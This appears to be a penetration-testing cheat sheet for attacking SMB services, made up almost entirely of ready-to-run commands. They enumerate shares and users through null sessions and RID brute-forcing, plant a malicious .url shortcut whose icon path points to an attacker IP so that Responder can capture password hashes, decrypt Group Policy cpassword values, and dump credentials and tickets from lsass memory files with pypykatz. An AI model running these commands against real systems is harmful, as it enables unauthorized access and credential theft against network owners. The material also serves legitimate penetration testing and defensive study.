# Server Message Block

#### Search For Known SMB Version Vulnerabilities

#### Check For Shares Using Null Sessions

```
smbclient -N -L //$ip/
```

```
cme smb $ip --shares -u "guest" -p ""
```

#### Test for URL File attacks

_Test for URL File attacks by creating a file called "@somename.url" with the following contents, upload, spin up smbserver to capture hash_

```
[InternetShortcut]
URL=blah
WorkingDirectory=blah
IconFile=\\EnterAttackerip\%USERNAME%.icon
IconIndex=1
```

_Run Responder to capture hashes_

```
/opt/Responder-3.1.3.0/Responder.py -I tun0
```

#### Test for read / upload access

_Attempt to download and view share contents using valid credential / anonymous login / null session_

```
smbmap -u guest -p "" -H $ip -A '.*' -R
```

#### Cpassword discovery

_Search "Groups.xml" for cpassword decryption_

```
gpp-decrypt cpassword
```

#### lsass.zip lsass.dmp

_search lsass.zip or lsass.dmp to use to dump credentials / keys / tickets_

```
pypykatz lsa minidump "lsass.zip"
```

#### Alternate Data Streams (ADS)

_test for alternate data streams after discovering 0 byte files_

```
allinfo filename
```

#### Check Password Policy

```
cme smb $ip --pass-pol -u guest -p ""
```

#### User Discovery

_Check For users using valid credential / anonymous login / null session_

```
cme smb $ip --users -u guest -p ""
```

```
cme smb $ip --rid-brute -u guest -p ""
```

#### Group discovery

_check for groups using valid credential / anonymous login / null session_

```
cme smb $ip --groups -u guest -p ""
```

#### Smbclient

_Interactively access the smb shares using smbclient_

```
smbclient //$ip/someshare -N
```

```
smbclient //$ip/someshare -U 'guest' -N
```

```
smbclient //$ip/someshare -U 'validuser' -p 'validpass'
```
